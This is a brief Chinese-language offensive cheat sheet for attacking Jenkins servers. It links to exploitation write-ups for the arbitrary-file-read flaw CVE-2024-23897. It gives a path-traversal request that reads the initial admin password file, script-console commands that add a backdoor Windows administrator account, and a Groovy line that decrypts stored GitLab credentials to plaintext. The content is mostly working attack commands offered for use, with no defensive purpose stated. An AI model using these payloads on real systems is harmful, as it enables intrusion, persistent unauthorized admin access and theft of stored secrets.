[批量扫描脚本-Jenkins任意文件读取(CVE-2024-23897)](https://mp.weixin.qq.com/s/eES8iWuu1MNJQFUCib5L3Q)
[CVE-2024-23897 Jenkins 任意文件读取一键利用](https://mp.weixin.qq.com/s/fQd193hBrqKGpC-L7kxHBQ)

# 查找密码
Jenkins 用户名为 admin, 服务密码在
```bash
/tools/content-log.php?logfile=../../../../../../../../../ProgramData/Jenkins/.jenkins/secrets/initialAdminPassword
```
# 命令执行
Dashboard > Manage Jenkins > 脚本命令执行
```bash
println "net user dotast qwer1234! /add".execute().text  
println "net localgroup administrators dotast /add".execute().text  
```
# 查找凭据
Dashboard > Manage Jenkins > Credentials

gitlab 解明文
```bash
println(hudson.util.Secret.fromString("{AQAAABAAAAAg9+7GBocqYmo0y3H+uDK9iPsvst95F5i3QO3zafrm2TC5U24QCq0zm/GEobmrmLYh}").getPlainText())
```
